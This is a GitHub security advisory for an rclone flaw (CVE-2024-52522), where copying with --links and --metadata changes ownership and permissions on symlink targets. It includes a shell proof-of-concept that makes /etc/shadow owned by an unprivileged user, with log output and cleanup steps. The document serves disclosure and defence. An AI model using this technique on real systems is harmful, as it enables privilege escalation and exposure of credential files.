# [M] Rclone has Improper Permission and Ownership Handling on Symlink Targets with --links and --metadata

## Summary
Severity: Medium
Advisory: GHSA-hrxh-9w67-g4cv
CVE: CVE-2024-52522
CWE: CWE-281
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2024-11-19
Source: https://github.com/advisories/GHSA-hrxh-9w67-g4cv
Type: github-advisory

## Affected
- Go: `github.com/rclone/rclone` — affected >=1.59.0 <1.68.2

## Details
### **tl;dr:**

unprivileged user creates a symlink to /etc/sudoers, /etc/shadow or similar and waits for a privileged user or process to copy/backup/mirror users data (using `--links` and `--metadata`). unprivileged user now owns /etc/sudoers.

### Summary

Insecure handling of symlinks with `--links` and `--metadata` in rclone while copying to local disk allows unprivileged users to indirectly modify ownership and permissions on symlink target files when a superuser or privileged process performs a copy. This vulnerability could enable privilege escalation and unauthorized access to critical system files (e.g., /etc/shadow), compromising system integrity, confidentiality, and availability.

For instance, an unprivileged user could set a symlink to a sensitive file within their home directory, waiting for an administrator or automated process (e.g., a cron job running with elevated privileges) to copy their files with rclone using the --links and --metadata options. Upon copying, rclone will incorrectly apply chown and chmod to the symlink’s target file rather than just the symlink itself, resulting in ownership and permission changes on the sensitive file.

### Who is affected

If you are not using `--metadata` **and** `--links` **and** copying files **to** the local backend you are not affected by this issue.

If you are using `--metadata` and `-links` and copying files to the local backend but not as a superuser, then this will manifest itself as a bug by setting incorrect permissions.

If you are using `--metadata` and `-links` and copying files to the local backend but as a superuser then this could affect you.

### Details

When copying directories containing symlinks with rclone using the --links and --metadata options, rclone mistakenly applies chown and chmod operations to the target of the symlink instead of the symlink itself. As a result, ownership and permissions on sensitive system files (e.g., /etc/shadow) may be altered if they are the target of any symlink within the copied directory structure. This allows users to affect the permissions and ownership of files they should not have access to, resulting in privilege escalation and potential system compromise.

### PoC

```
# Create a directory to simulate a user home directory
root@workstation:~# mkdir -p /tmp/home/user1
root@workstation:~# sudo chown user1:user1 /tmp/home/user1
```
```
# As user1, create a symlink to /etc/shadow within their home directory
root@workstation:~# sudo -u user1 ln -s /etc/shadow /tmp/home/user1/shadow_link
```
```
# List permissions on the original files
root@workstation:~# ls -l /tmp/home/user1/shadow_link /etc/shadow
----------. 1 root  root  1283 Nov  5 13:30 /etc/shadow
lrwxrwxrwx. 1 user1 user1   11 Nov  5 13:56 /tmp/home/user1/shadow_link -> /etc/shadow
```
```
# Copy the directory structure with rclone
root@workstation:~# rclone copy /tmp/home /tmp/home_new --links --metadata --log-level=DEBUG
2024/11/05 13:56:53 DEBUG : rclone: Version "v1.68.1" starting with parameters ["rclone" "copy" "/tmp/home" "/tmp/home_new" "--links" "--metadata" "--log-level=DEBUG"]
2024/11/05 13:56:53 DEBUG : Creating backend with remote "/tmp/home"
2024/11/05 13:56:53 NOTICE: Config file "/root/.config/rclone/rclone.conf" not found - using defaults
2024/11/05 13:56:53 DEBUG : local: detected overridden config - adding "{b6816}" suffix to name
2024/11/05 13:56:53 DEBUG : fs cache: renaming cache item "/tmp/home" to be canonical "local{b6816}:/tmp/home"
2024/11/05 13:56:53 DEBUG : Creating backend with remote "/tmp/home_new"
2024/11/05 13:56:53 DEBUG : local: detected overridden config - adding "{b6816}" suffix to name
2024/11/05 13:56:53 DEBUG : fs cache: renaming cache item "/tmp/home_new" to be canonical "local{b6816}:/tmp/home_new"
2024/11/05 13:56:53 DEBUG : Added delayed dir = "user1", newDst=<nil>
2024/11/05 13:56:53 DEBUG : user1/shadow_link.rclonelink: Need to transfer - File not found at Destination
2024/11/05 13:56:53 DEBUG : user1/shadow_link.rclonelink: md5 = 2fe8599cb25a0c790213d39b3be97c27 OK
2024/11/05 13:56:53 INFO  : user1/shadow_link.rclonelink: Copied (new)
2024/11/05 13:56:53 DEBUG : Local file system at /tmp/home_new: Waiting for checks to finish
2024/11/05 13:56:53 DEBUG : Local file system at /tmp/home_new: Waiting for transfers to finish
2024/11/05 13:56:53 INFO  : user1: Updated directory metadata
2024/11/05 13:56:53 INFO  :
Transferred:             11 B / 11 B, 100%, 0 B/s, ETA -
Transferred:            1 / 1, 100%
Elapsed time:         0.0s

2024/11/05 13:56:53 DEBUG : 6 go routines active
```
```
# List permissions again
root@workstation:~# ls -l /tmp/home/user1/shadow_link /etc/shadow /tmp/home_new/user1/shadow_link
-rwxrwxrwx. 1 user1 user1 1283 Nov  5 13:30 /etc/shadow                                                 # Wrong, very wrong. Should be root:root and 0000.
lrwxrwxrwx. 1 root  root    11 Nov  5 13:56 /tmp/home_new/user1/shadow_link -> /etc/shadow              # Wrong too, should be user1:user1
lrwxrwxrwx. 1 user1 user1   11 Nov  5 13:56 /tmp/home/user1/shadow_link -> /etc/shadow
```
```
# Fix /etc/shadow and clean up
root@workstation:~# chown root:root /etc/shadow
root@workstation:~# chmod 000 /etc/shadow
root@workstation:~# rm -rf /tmp/home /tmp/home_new
```
### Impact
Type of Vulnerability: Improper permissions and ownership handling on symlink targets (Insecure Handling of Symlinks)

Impact: This vulnerability allows unprivileged users to modify permissions and ownership of sensitive system files by creating symlinks to those files in directories that are subsequently copied by an administrator with rclone --links --metadata. This can lead to unauthorized access, privilege escalation, and potential system compromise.

## References
- https://github.com/rclone/rclone/security/advisories/GHSA-hrxh-9w67-g4cv
- https://nvd.nist.gov/vuln/detail/CVE-2024-52522
- https://github.com/rclone/rclone/commit/01ccf204f42b4f68541b16843292439090a2dcf0
- https://github.com/rclone/rclone
